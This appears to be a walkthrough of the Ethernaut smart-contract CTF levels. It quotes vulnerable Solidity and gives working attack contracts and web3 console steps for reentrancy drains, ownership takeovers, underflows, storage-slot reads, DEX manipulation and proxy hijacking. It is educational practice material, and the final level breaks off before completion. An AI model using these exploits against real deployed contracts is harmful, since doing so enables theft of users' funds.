# Ethernaut CTF

# 1. [Challenge 1 : Fallback](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

Tasks: \
    1. you claim ownership of the contract \
    2. you reduce its balance to 0

**Solution:** \
Vulnerable Code: 
```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
It's fallback function and here 2 requirements required to make ourself owner

- First we need to contribute some ether to satisfy ```contributions[msg.sender] > 0``` requirements 
- To satisfy 2nd requirements we need send some ether in this fallback function. As fallback function execute when the requested function isn't available. So we can execute ```contract.sendTransaction({"value": 1})``` this to satisfy 2nd requirements and make ourself owner

- To reduce contract balance to 0 we can simply call ```withdraw``` function and able to solve the 1st challenge.


# 2. [Challenge 2: Fallout](https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5)

Tasks: 
- Claim ownership of the contract below to complete this level.

**Solution:** \
Vulnerable Code: 
```
  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

This constructor function name has a typo. So, to achieve ownership we just need to call ```Fal1out``` function and able to the 2nd challenge


# 3. [Challenge 3: Coin Flip](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

Tasks: 
- This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

**Solution:** \
Vulnerable Code: 
```
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
```

Attack Payload:
```
contract Attack {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack(CoinFlip coinFlip) public {

    uint256 guess1 = uint256(blockhash(block.number - 1));
    uint256 guess = uint256(guess1/FACTOR);
    bool _guess = guess == 1 ? true : false;
    coinFlip.flip(_guess);

    }
}
```
We can win this unlimite time by just mimicing the checker functions of `flip` function

# 4. [Challenge 4: Telephone](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768)

Tasks: 
- Claim ownership of the contract below to complete this level.

**Solution:** \
Vulnerable Code:
```
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
```

Attack Payload:
```
contract Attack {
    function attack(Telephone telephone) public {
        telephone.changeOwner(tx.origin);
    }
}
```
This `changeOwner` function is basically checking if `tx.origin` not equally `msg.sender` it will set user inputed address as owner. So we can do is create a smart contract that will call the `changeOwner` function we can satisfy the check and make ourself as owner.


# 5. [Challenge 5: Token](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE)

Tasks: 
- The goal of this level is for us to hack the basic token contract below. We are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

**Solution:** \
Vulnerable Code:
```
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```
The `transfer` function is taking address whom we want to send token and `value` how much we want send but in 3rd line we can execute `Arithmetic Overflow and Underflow` by submiting 21 (As we have 20 TOKEN) So it will underflow the arithmetic function and add (2^256 - 1) this much token in our wallet



# 6. [Challenge 6: Delegation](https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493)

Tasks: 
- The goal of this level is for you to claim ownership of the instance you are given.

**Solution:** \
Vulnerable Code:
```
  function pwn() public {
    owner = msg.sender;
  }
```
```
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
```

Attack Payload:
```
contract Attack {
    address public delegation;

    constructor(address _delegation) public {
        delegation = _delegation;
    }

    function attack() public {
        delegation.call(abi.encodeWithSignature("pwn()"));
    }
}
```
To solve in command line:
```
var functionSignature = web3.utils.sha3("pwn()")
contract.sendTransaction({data: functionSignature})
```

Eve called Attack.attack().
Attack called the `fallback` function of `Delegation` sending the function selector of `pwn()`. `Delegation` forwards the call to `Delegate` using delegatecall.
Here `msg.data` contains the function selector of `pwn()`.
This tells Solidity to call the function `pwn()` inside `Delegate`.
The function `pwn()` updates the owner to `msg.sender`.
Delegatecall runs the code of `Delegate` using the context of `Delegation`.
Therefore `Delegation`'s storage was updated to `msg.sender` where `msg.sender` is the caller of `Delegation`, in this case Attack.


# 7. [Challenge 7: Force](https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea)

Tasks:
- Some contracts will simply not take your money ??\_(???)_/??
- The goal of this level is to make the balance of the contract greater than zero.

**Solution:** \
Vulnerable Code:
Attack Payload:
```
contract Attack {
    Force force;

    constructor(Force _force) public {
        force = Force(_force);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
```
To solve the challenge we can simply use `selfdestruct` in our contract and than it will send all the ether to our desire address.


# 8. [Challenge 8: Vault](https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188)

Tasks:
- Unlock the vault to pass the level!

**Solution:** \
Vulnerable Code:
```
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }
```

To solve in command line:
```
await web3.eth.getStorageAt(contract.address, 1)
web3.utils.toAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter. 



# 9. [Challenge 9: King](https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5)

Tasks:
- The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

- Such a fun game. Your goal is to break it.
- When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

**Solution:** \
Vulnerable Code:
```
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
```

Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.17;

contract Solution {
    constructor() public payable {
        // this address is the address of your level instance contract
        address payable contractAddr = 0xDFE781807B2668D44BaB804e8cb5c4D685Ab2eff;
        address(contractAddr).call.value(msg.value)("");
    }
    
    function() external payable {
        revert("lmao sucks");
    }
}
```

In the 3rd line of vulnerable function it's sending the ether to the previous king and than set highest ether sender user as king. In our attack contract when the vulnerable contract will try to send ether for setting new king. Our contract will revert that and other user will never be able to become king




# 10. [Challenge 10: Re-entrancy](https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D)

Tasks:
- The goal of this level is for you to steal all the funds from the contract.

**Solution:** \
Vulnerable Code:
```
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```

Attack Payload:
```
pragma solidity ^0.6.10;

import './Reentrance.sol';

contract EthernautReentrancyAttack {
    Reentrance target; 
    
    constructor(address payable _targetAddr) public payable {
        target = Reentrance(_targetAddr);
    }
    
    function donateToTarget() public {
        target.donate.value(1000000000000000).gas(4000000)(address(this)); //need to add value to this fn
    }
    
    fallback() external payable {
        if (address(target).balance != 0 ) {
            target.withdraw(1000000000000000); 
        }
    }

    function withdrawblanace() payable public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```
This contract is vulnerable to re-entracy attack as it's updating user balance after external contract call. So malicious can create a loop on withdraw function from 1st line to 3rd line and it will withdraw all the ether available on the contract.


# 11. [Challenge 11: Elevator](https://ethernaut.openzeppelin.com/level/0xaB4F3F2644060b2D960b0d88F0a42d1D27484687)


Tasks:
- This elevator won't let you reach the top of your building. Right?

**Solution:** \
Vulnerable Code:
```
  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
```

Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Elevator.sol';

contract ElevatorAttack {
    Elevator public elevator;
    bool result = true;

    constructor(address _elevator) public {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) external returns(bool) {
        if(result == true) {
            result = false; 
        } else {
            result = true; 
        }
        return result;
    }

    function callGoTo() public {
        elevator.goTo(13);
    }
}
```
we created our own implementation of the `isLastFloor()` method because the building references an instance of `Building(msg.sender)`, our `ElevatorAttack` contract can be that reference, meaning our own `isLastFloor()` method can be used to return whatever we want our method returned false and then true in order to fulfull this level's requirements





# 12. [Challenge 12: Privacy](https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B)

Tasks:
- The creator of this contract was careful enough to protect the sensitive areas of its storage. Unlock this contract to beat the level.

Helpful Resources: 
- [Walkthrough](https://www.goodbytes.be/blog/article/ethernaut-walkthrough-level-12-privacy)
- [Storage In Solidity](https://docs.soliditylang.org/en/v0.8.10/internals/layout_in_storage.html)
- [Read Ethereum Contract Storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)

**Solution:** \
Vulnerable Code:
```
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
```

Command to get the private data: 
```
await web3.eth.getStorageAt(contract.address, 5)
```

Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Privacy.sol';

contract PrivacyAttack {
    Privacy public privacy;

    constructor(address _privacy) public { 
        privacy = Privacy(_privacy);
    }

    function callUnlock(bytes32 _slotvalue) public {
        bytes16 key = bytes16(_slotvalue);
        privacy.unlock(key);
    }
}
```
Again, we are confronted with the fact that you can't keep any data private when it's stored on the public blockchain (unless of course, you encrypt it) once we understand storage slots, we can more easily grab any value from any contract that we want.



# 13. [Challenge 13: Gatekeeper One](https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A)

Tasks:
- Make it past the gatekeeper and register as an entrant to pass this level.

Helpful Resources:
- [Solution Video](https://www.youtube.com/watch?v=TH3ZeWcISmY)
- [Gatekeeper One Solution](https://cyanwingsbird.blog/solidity/ethernaut/13-gatekeeper-one/)

**Solution:** \
Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract AreYouTheKeymaster{
    using SafeMath for uint256;
    bytes8 txOrigin16 = 0x25E73b3f79C43564; //0x3FcB875f56beddC4; //last 16 digits of your account
    bytes8 public key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
    GatekeeperOne public gkpOne;

 
    constructor(address _addr) public{
        gkpOne = GatekeeperOne(_addr);
    }

    function letMeIn() public{
         for (uint256 i = 0; i < 120; i++) {
         (bool result, bytes memory data) = address(gkpOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
      if(result)
        {
        break;
      }
    }
  }
        
    
}
```



# 14. [Challenge 14: Gatekeeper Two](https://ethernaut.openzeppelin.com/level/0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d)

Tasks:
- This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

Helpful Resources:
- [Gatekeeper Two Solution](https://cyanwingsbird.blog/solidity/ethernaut/14-gatekeeper-two/)

**Solution:** \
Attack Payload:
```
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwo {
    address levelInstance;
    
    constructor(address _levelInstance) {
      levelInstance = _levelInstance;
      unchecked{
          bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1  );
          IGatekeeperTwo(levelInstance).enter(key);
      }
    }
}
```

`^` is `Bitwise XOR` , so `a^b=c`, then `a^c=b`. Also, since `Solidity 0.8` , operations come with built-in underflow and overflow checks. Therefore, it is necessary to include the operation part with `unchecked {}`, otherwise the above operation will cause the transaction to fail. 



# 15. [Challenge 15: Naught Coin](https://ethernaut.openzeppelin.com/level/0x096bb5e93a204BfD701502EB6EF266a950217218)

Tasks:
- NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

**Solution:** \
Payload for CMD line:
```
await contract.approve(player, "1000000000000000000000000")
await contract.transferFrom(player, "0x5206e78b21Ce315ce284FB24cf05e0585A93B1d9", "1000000000000000000000000")

To check allowed token to transfer: (await contract.allowance(player, player)).toString()
```

ERC20 has 3 optional function and 6 mandatory function. In the CTF contract only `transfer` function has `lockTokens ` modifier but we can use `approve` function approve other user to spend the tokens for this challenge we approve ourselves for spender and then we can use `transferFrom` function to send all token to any address to solve the challenge.


# 16. [Challenge 16: Preservation](https://ethernaut.openzeppelin.com/level/0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F)

Tasks:
- The goal of this level is for you to claim ownership of the instance you are given.

**Solution:** \
Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Attack {
    // Make sure the storage layout is the same as Preservation
    // This will allow us to correctly update the state variables
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public hackMe;

    constructor(Preservation _hackMe) public {
        hackMe = Preservation(_hackMe);
    }

    function attack() public {
        // this will execute setTime function Preservation contract. 
        // Then HackeMe contract delegatecall the LibraryContract contract and 
        // it will change Preservation contract's timeZone1Library state variable to our address
        hackMe.setFirstTime(uint(uint160(address(this))));
        // pass any number as input, the function setTime() below will
        // be called and it will execute Attacker contract setTime function and 
        // change the Preservation contract's owner address to Attacker contract's address
        hackMe.setFirstTime(1);
    }

    // function signature must match HackMe.doSomething()
    function setTime(uint _num) public {
        owner = msg.sender;
    }
}
```

Inside `attack()`, the first call to `setTime()` changes the address of `LibraryContract` store in `Preservation`. Address of `LibraryContract` is now set to Attack. The second call to `setTime()` calls `Attack.setTime()` and here we change the owner.




# 17. [Challenge 17: Recovery](https://ethernaut.openzeppelin.com/level/0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2)

Tasks:
- A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address. This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.

Helpful Resources:
- [Ethereum quirks](https://swende.se/blog/Ethereum_quirks_and_vulns.html)

**Solution:** \
To Solve in cmd line:
```
data = web3.eth.abi.encodeFunctionCall({name: 'destroy', type: 'function', inputs: [{type: 'address', name: '_to'}]}, [player]);
await web3.eth.sendTransaction({to: "0xA0ffB380c2F8558474089A14767D8A0d0A5e9d05", from: player, data: data})
```

Attack Payload:
```
pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract SimpleToken {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function withdraw() public {
        ISimpleToken(levelInstance).destroy(payable(msg.sender));
    }
}
```

This level requires to retrieve the address of SimpleToken. 
The easiest way is to open etherscan and look at the transaction data directly, and you can directly see which address the ether was sent to. 
Another method is to use the level contract address to calculate the contract address of SimpleToken. For the easiest understanding, please refer to [here](https://docs.openzeppelin.com/cli/2.8/deploying-with-create2#creating_a_smart_contract) :
`keccack256(address, nonce)` where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).


# 19. [Challenge 19: Alien Codex](https://ethernaut.openzeppelin.com/level/0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272)

Tasks:
- You've uncovered an Alien contract. Claim ownership to complete the level.

Useful Resources:
- [Solution](https://github.com/STYJ/Ethernaut-Solutions)

**Solution:** \
Attack Payload:
```
pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodex {
    address levelInstance;
    
    constructor(address _levelInstance) {
      levelInstance = _levelInstance;
    }
    
    function claim() public {
        unchecked{
            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
            IAlienCodex(levelInstance).revise(index, bytes32(uint256(uint160(msg.sender))));
        }
    }
}
```

This chapter focuses on understanding array underflow in storage and how to calculate the storage location of elements in array in storage. 
Watching the code first, you will see that all functions require contact=true to be called. Open Console (F12) and call the make_contact function: `contract.make_contact()`

At this point, you can view the data stored in codex in storage:

`> await web3.eth.getStorageAt(instance, 1);`\
`< "0x0000000000000000000000000000000000000000000000000000000000000000"`

codex is an array of bytes32, the length of the array is stored in slot 1, and the data of the actual elements in the array is stored in another method
At this point, if we call the retract function, the array of codex can be underflowed: `contract.retract()`
Look again at the data in slot 1 after the call:

`> await web3.eth.getStorageAt(instance, 1);`\
`< "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"`

It can be seen that the array length in slot 1 underflows to the maximum value.

Recalling the requirements of the level, we need to override the value of owner, and the value of owner is in slot 0. Therefore, as long as the position of an array element is calculated, the position of the element will point to slot 0 because the maximum storage capacity of the storage is 2^256 slots because of the overflow. At this time, rewriting the codex element is equivalent to rewriting the value of owner.

To calculate the value, you must first know the formula for the slot position of the element in the array. The formula is very simple: `keccak256(slot) + index`
The codex array is defined at slot 1, so the first element is at slot keccak256(1) + 0, the second at slot keccak256(1) + 1, and so on.

The maximum number of slots in Storage is 2^256, and the value is 0 ??? 2^256-1, because as long as the value is written in slot 2^256, it will overflow into slot 0.

Integrate the above formula, namely: `2^256 = keccak256(slot) + index`
Rearrange it, that is: `index = 2^256 - keccak256(slot)`
As long as the revise function is called and the address of the player is written into `codex[2^256 ??? keccak256(slot)]`, the address of the original `owner` can be overwritten to complete this level. 





# 20. [Challenge 20: Denial](https://ethernaut.openzeppelin.com/level/0xf1D573178225513eDAA795bE9206f7E311EeDEc3)

Tasks:
- This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner. If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

**Solution:** \
Attack Payload:
```
pragma solidity ^0.8.0;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Denial {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    fallback() external payable {
        IDenial(levelInstance).withdraw();
    }

    function set() public {
        IDenial(levelInstance).setWithdrawPartner(address(this));
    }
}
```

This level needs to prevent other people from withdrawing ether from the fund, that is, to prevent the withdrawal function from running. 

Looking at the level code, you can see that in the withdraw function, there is the following code: `partner.call.value(amountToSend)("");`

The partner in the code can be set through the `setWithdrawPartner` function above. Therefore, as long as the partner is set as the smart contract address, you can use `Re-entrancy` to repeatedly call the withdraw function in another contract until the gas is used up and the function cannot continue to execute. 


# 21. [Challenge 21: Shop](https://ethernaut.openzeppelin.com/level/0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB)

Tasks:
- ??an you get the item from the shop for less than the price asked?

**Solution:** \
Attack Payload:
```
pragma solidity ^0.7.0;

contract Buyer {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function price() public view returns (uint256) {
        return Shop(msg.sender).isSold() ? 0 : 100;
    }

    function attack() public {
        Shop(levelInstance).buy();
    }
}
```
we created our own implementation of the `price()` method because the building references an instance of `Buyer(msg.sender)`, our `Buyer` contract can be that reference, meaning our own `price()` method can be used to return whatever we want to fulfull this level's requirements.




# 22. [Challenge 22: Dex](https://ethernaut.openzeppelin.com/level/0x0b0276F85EF92432fBd6529E169D9dE4aD337b1F)

Tasks:
- You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

**Solution:** \
To Solve in console:
```
First approve contract to transact on our behalf
contract.approve(instance, 100)
```

```
await contract.swap(await contract.token1(), await contract.token2(), 10);
await contract.swap(await contract.token2(), await contract.token1(), 20);
await contract.swap(await contract.token1(), await contract.token2(), 24);
await contract.swap(await contract.token2(), await contract.token1(), 30);
await contract.swap(await contract.token1(), await contract.token2(), 41);
await contract.swap(await contract.token2(), await contract.token1(), 45);
```

Since the price relies on the token amount of the contract, we could swap reversibly until either token1 or token2 has 0 amount. In addition, the mathematic precision issue exists due to the fact that Solidity is no floating-point currently, so, the number is round down e.g., 24.444 to 24. We can illustrate the swapping as follows:
Initial balance.
    Player???s balance:
    10 token1
    10 token2
    Contract???s balance:
    100 token1
    100 token2
    The received amount if swap 10 token1 to token2:
    (10 * 100) / 100 = 10 token2
Player???s balance (swap 10 token1 to token2) :
    0 token1
    20 token2
    Contract???s balance:
    110 token1
    90 token2
    Received amount if swap 20 token2 to token1:
    (20 * 110) / 90 ~ 24.444 = 24 token1 (round down)

In the last swapping, we???ll have 65 token2. We cannot swap `65 token2` to `158** token1` since `token1` is not enough as of the current price. The contract currently has `110 token1` and `45 token2`. `(65 * 110 )/45 = 158`
If we need to drain all 110 token1, the amount of token2 to be swapped is: `(65 * 110) / 158 = 45`



# 23. [Challenge 23: Dex Two](https://ethernaut.openzeppelin.com/level/0xd2BA82c4777a8d619144d32a2314ee620BC9E09c)

Tasks:
- You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

**Solution:** \
Attack Payload:
```
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/token/ERC20/ERC20.sol";

contract MaliciousToken is ERC20 {
    constructor () public ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000000 * (10 ** uint256(decimals())));
    }
}
```
1. Create MAL token by using Openzeppelin???s ERC20 and mint 1M of MAL to our address via _mint()
2. Approve the Dex contract: `Dex_address, 1000000`
3. Add MAL token to the Dex contract via `add_liquidity()`
```
let MAL = "0x17E82E862fA262F80332Bb527C34BcC2755C9318";
await contract.add_liquidity(MAL, 100)
```
4. Now, we can use 100 MAL to swap 100 token2 indicating from `get_swap_price()`
```
(await contract.get_swap_amount(MAL, await contract.token1(), 100)).toString()
```
5. Swap 100 MAL for 100 token2 using swap(). We successfully solve the 1st requirement for the challenge since the current balance of token1 in the Dex contract is 0
```
await contract.swap(MAL, await contract.token1(), 100);
Check Balance: (await contract.balanceOf(await contract.token1(), instance)).toString()
```
6. Now to swap 200 MAL for 100 token1 using swap(). We successfully solve the challenge since the current balance of token1 and token2 in the Dex contract is 0
```
await contract.swap(MAL, await contract.token2(), 200);
Check Balance: (await contract.balanceOf(await contract.token2(), instance)).toString()
```


# 24. [Challenge 24: Puzzle Wallet](https://ethernaut.openzeppelin.com/level/0xe13a4a46C346154C41360AAe7f070943F67743c9)

Tasks:
- You'll need to hijack this wallet to become the admin of the proxy.

**Solution:** \
To Solve in console:

1. Since, delegatecall is context preserving, the context is taken from PuzzleProxy. Meaning, any state read or write in storage would happen in PuzzleProxy at a corresponding slot, instead of PuzzleWallet.

Compare the storage variables at slots:
```
slot | PuzzleWallet  -  PuzzleProxy
----------------------------------
 0   |   owner      <-  pendingAdmin
 1   |   maxBalance <-  admin
```
Accordingly, any write to pendingAdmin in PuzzleProxy would be reflected by owner in PuzzleWallet because they are at same storage slot, 0!

And that means if we set pendingAdmin to player in PuzzleProxy (through proposeNewAdmin method), player is automatically owner in PuzzleWallet! That's exactly what we'll do. Although contract instance provided web3js API, doesn't expose the proposeNewAdmin method, we can alway encode signature of function call and send transaction to the contract:
```
functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}

params = [player]

data = web3.eth.abi.encodeFunctionCall(functionSignature, params)

await web3.eth.sendTransaction({from: player, to: instance, data})

```
2. player is now owner. Verify by:
```
await contract.owner() === player

// Output: true
```
3. Now, since we're owner let's whitelist us, player:
```
await contract.addToWhitelist(player)
```
4. Okay, so now player can call onlyWhitelisted guarded methods.

Also, note from the storage slot table above that admin and maxBalance also correspond to same slot (slot 1). We can write to admin if in some way we can write to maxBalance the address of player.

Two methods alter maxBalance - init and setMaxBalance. init shows no hope as it requires current maxBalance value to be zero. So, let's focus on setMaxBalance.

setMaxBalance can only set new maxBalance only if the contract's balance is 0. Check balance:
```
await getBalance(contract.address)

// Output: 0.001
```
5. Bad luck! It's non-zero. Can we somehow take out the contract's balance? Only method that does so, is execute, but contract tracks each user's balance through balances such that you can only withdraw what you deposited. We need some way to crack the contract's accounting mechanism so that we can withdraw more than deposited and hence drain contract's balance.

A possible way is to somehow call deposit with same msg.value multiple times within the same transaction. Hmmm...the developers of this contract did write logic to batch multiple transactions into one transaction to save gas costs. And this is what multicall method is for. Maybe we can exploit it?

But wait! multicall actually extracts function selector (which is first 4 bytes from signature) from the data and makes sure that deposit is called only once per transaction!
```
assembly {
    selector := mload(add(_data, 32))
}
if (selector == this.deposit.selector) {
    require(!depositCalled, "Deposit can only be called once");
    // Protect against reusing msg.value
    depositCalled = true;
}
```

We need another way. Think deeper...we can only call deposit only once in a multicall...but what if call a multicall that calls multiple multicalls and each of these multicalls call deposit once...aha! That'd be totally valid since each of these multiple multicalls will check their own separate depositCalled bools.

The contract balance currently is 0.001 eth. If we're able to call deposit two times through two multicalls in same transaction. The balances[player] would be registered from 0 eth to 0.002 eth, but in reality only 0.001 eth will be actually sent! Hence total balance of contract is in reality 0.002 eth but accounting in balances would think it's 0.003 eth. Anyway, player is now eligible to take out 0.002 eth from contract and drain it as a result. Let's begin.

Here's our call inception (calls within calls within call!)
```
           multicall
               |
        -----------------
        |               |
     multicall        multicall
        |                 |
      deposit          deposit 
```
6. Get function call encodings:
```
// deposit() method
depositData = await contract.methods["deposit()"].request().then(v => v.data)

// multicall() method with param of deposit function call signature
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
```
Now we call multicall which will call two multicalls and each of these two will call deposit once each. Send value of 0.001 eth with transaction:
```
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
```
7. player balance now must be 0.001 eth * 2 i.e. 0.002 eth. Which is equal to contract's total balance at this time. Withdraw same amount by execute:
```
await contract.execute(player, toWei('0.002'), 0x0)
```
8. By now, contract's balance must be zero. Verify:
```
await getBalance(contract.address)

// Output: '0'
```
9. Finally we can call setMaxBalance to set maxBalance and as a consequence of storage collision, set admin to player:
```
await contract.setMaxBalance(player)
```



# 25. [Challenge 25: Motorbike](https://ethernaut.openzeppelin.com/level/0x78e23A3881e385465F19c1a03E2F9fFEBdAD6045)

Tasks:
- Ethernaut's motorbike has a brand new upgradeable engine design. Would you be able to selfdestruct its engine and make the motorbike unusable ?

**Solution:** \
To Solve in console:

1. upgradeToAndCall method is at our disposal for upgrading to a new contract address, but it has an authorization check such that only the upgrader address can call it. So, player has to somehow take over as upgrader. The key thing to keep in mind here is that any storage variables defined in the logic contract i.e. Engine is actually stored in the proxy's (Motorbike's) storage and not actually Engine. Proxy is the storage layer here which delegates only the logic to logic/implementation contract (logic layer). What if we did try to write and read in the context of Engine directly, instead of going through proxy? We'll need address of Engine first. This address is at storage slot _IMPLEMENTATION_SLOT of Motorbike. Let's read it:
```
implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
implAddr = '0x' + implAddr.slice(-40)
```
2. Now, if we sent a transaction directly to initialize of Engine rather than going through proxy, the code will run in Engine's context rather than proxy's. That means the storage variables - initialized, initializing (inherited from Initializable), upgrader etc. will be read from Engine's storage slots. And these variables will most likely will contain their default values - false, false, 0x0 respectively because Engine was supposed to be only the logic layer, not storage. And since initialized will be equal to false (default for bool) in context of Engine the initializer modifier on initialize method will pass! Call the initialize at Engine's address i.e. at implAddr:
```
initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")

await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })
```
3. Alright, invoking initialize method must've now set player as upgrader. Verify by:
```
upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")

await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()

// Output: true

```
